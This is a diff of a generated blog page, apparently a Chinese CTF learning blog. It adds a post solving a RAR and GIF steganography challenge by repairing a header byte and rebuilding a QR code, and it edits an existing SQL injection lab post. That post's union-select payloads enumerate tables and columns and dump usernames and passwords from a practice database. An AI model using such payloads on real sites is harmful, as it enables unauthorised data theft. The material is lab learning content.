@@ -71,6 +71,87 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-simplerar" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/11/19/simplerar/" class="article-date">
+  <time class="dt-published" datetime="2021-11-19T05:53:49.000Z" itemprop="datePublished">2021-11-19</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/CTF/">-CTF</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/11/19/simplerar/">simplerar(简单密码学)</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>第一次完整地做一次杂项：</p>
+<p><strong>题目：</strong></p>
+<p>菜狗最近学会了拼图，这是他刚拼好的，可是却搞错了一块(ps:双图层)</p>
+<p><img src="../images/image-20211119135704931.png" alt="image-20211119135704931"></p>
+<p>打开附件，是一个rar压缩文件，在本地解压后，却发现只得到一个flag.txt文件，打开果然是没让我们失望的“flag is not here”,那我们就无脑丢进winhex(用来检查和修复各种文件、恢复被删除文件、以及硬盘损坏造成的数据丢失等):</p>
+<p><img src="../images/image-20211119140405589.png" alt="image-20211119140405589"></p>
+<p>可依然没有什么隐写，那我们就只能对刚开始的rar文件做分析了，那就直接用winhex打开这个文件：</p>
+<p><img src="../images/image-20211119140945977.png" alt="image-20211119140945977"></p>
+<p>但到这里除了ctrl+f查找一下flag貌似就不能干什么了，但查找后也没有直接的flag，想到题目是双图层，那我们的解题才刚开始！</p>
+<p>那只能拿rar文件结构做文章了：</p>
+<p><strong>RAR 是有四个文件块组成的，分别是分别是标记块、归档头部块、文件块、结束块，这些块之间没有固定地先后顺序，但要求第一个块必须是标志块并且其后紧跟一个归档头部块</strong>:</p>
+<p><img src="../images/image-20211119141840218.png" alt="image-20211119141840218"></p>
+<p>查看winhex 中标记块和结束块都正常，通过上面的知识点我们可以发现png 的图<br>片压缩的文件头有问题，文件块的HEAD_TYPE 应该是0×74 而不是0x7A:</p>
+<p><img src="../images/image-20211119142330572.png" alt="image-20211119142330572"></p>
+<p>直接改成74就行了，然后保存文件，接着再把刚刚修复好的rar文件解压，打开发现变成了一个secret.png图片，但打开却是一片空白，佛了。那就在丢进winhex看看l咯：</p>
+<p><img src="../images/image-20211119142836621.png" alt="image-20211119142836621"></p>
+<p>好家伙，是个gif，那就回去把图片后缀改成.gif。</p>
+<p>在继续打开看看，然而任然是空白的。那现在就打开stegsolve(<em>图像隐写工具，支持使用不同方式解除图像隐写，是图像隐写的必备工具，当两张jpg图片外观、大小、像素都基本相同时，将两个文件的像素RGB值进行XOR、ADD、SUB等操作，看能否得到有用的信息。此工具的优点是简单方便，扩展性非常强，能进行批量自动化处理，对于自己编写的脚本，就可以方便的进行扩展</em>**)</p>
+<p>题目说是双图层，那我们点击Analyse里的frame browser(帧处理)发现有两张图，</p>
+<img src="../images/image-20211119144009939.png" alt="image-20211119144009939" style="zoom:67%;" />
+
+
+
+<p>分别保存为.png格式：</p>
+<p><img src="../images/image-20211119144039179.png" alt="image-20211119144039179"></p>
+<p>然后再分别在stegsolve打开这两个png图片,并调到 red plane 0，发现了两个一半的二维码：（按下面的“&gt;”）</p>
+<img src="../images/image-20211119144330578.png" alt="image-20211119144330578" style="zoom: 67%;" />
+
+<img src="../images/image-20211119144522370.png" alt="image-20211119144522370" style="zoom:67%;" />
+
+<p>但这个上半部分的还是残缺的，没事，我们随便去网上找个二维码，把它左上角的裁下来，用ps拼上去：（先把上下部分都裁剪成矩形再分别保存，因为一开始它们都是方形的，空白部分是不需要的，然后再文件-&gt;新建-&gt;剪贴板，把刚刚剪好的两张图片拖进去使其尽量重合，其实有点bug关系不大，QR Research都可以扫出来，最后在补上左上角的就OK了）</p>
+<img src="../images/image-20211119144828263.png" alt="image-20211119144828263" style="zoom: 25%;" />
+
+
+
+<p>导出后保存为png，在QR Research（扫描二维码）中打开，得到flag：</p>
+<img src="../images/image-20211119145644631.png" alt="image-20211119145644631" style="zoom: 50%;" />
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/11/19/simplerar/" data-id="ckw61eyxy0000tkuier33cy3r" data-title="simplerar(简单密码学)" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/misc/" rel="tag">-misc</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-autohotkey" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2021/11/17/autohotkey/" class="article-date">
@@ -608,7 +689,7 @@
 <p><img src="/images/20180618230947113.png" alt="20180618230947113"></p>
 <p>查询security内的所有表名：?id=861’ union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(table_name) from information_schema.tables where table_schema=’security’)–+ </p>
 <p><img src="/images/20180618230958453-16329233542211.png" alt="20180618230958453"></p>
-<p>然后爆破出列名：?id=861’ union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(table_name) from information_schema.tables where table_schema=’security’)–+ </p>
+<p>然后爆破出列名：?id=861’ union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(column_name) from information_schema.columns where table_schema=’security’)–+ </p>
 <p><img src="/images/2018061823100417-16329234868492.png" alt="2018061823100417"></p>
 <p>最后爆出他的username和password:</p>
 <p>?id=861’ union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(username) from security.users)–+ </p>
@@ -730,7 +811,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tags</h3>
     <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/autohotkey/" rel="tag">-autohotkey</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag">-web安全</a></li></ul>
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/autohotkey/" rel="tag">-autohotkey</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">-misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag">-web安全</a></li></ul>
     </div>
   </div>
 
@@ -740,7 +821,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget tagcloud">
-      <a href="/tags/autohotkey/" style="font-size: 10px;">-autohotkey</a> <a href="/tags/web%E5%AE%89%E5%85%A8/" style="font-size: 20px;">-web安全</a>
+      <a href="/tags/autohotkey/" style="font-size: 10px;">-autohotkey</a> <a href="/tags/misc/" style="font-size: 10px;">-misc</a> <a href="/tags/web%E5%AE%89%E5%85%A8/" style="font-size: 20px;">-web安全</a>
     </div>
   </div>
 
@@ -762,6 +843,10 @@
       <ul>
         
           <li>
+            <a href="/2021/11/19/simplerar/">simplerar(简单密码学)</a>
+          </li>
+        
+          <li>
             <a href="/2021/11/17/autohotkey/">autohotkey</a>
           </li>
         
@@ -775,10 +860,6 @@
         
           <li>
             <a href="/2021/09/30/Less-5-6/">Less 5,6</a>
-          </li>
-        
-          <li>
-            <a href="/2021/09/30/sql%20%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B/">sql 注入简介</a>
           </li>
         
       </ul>
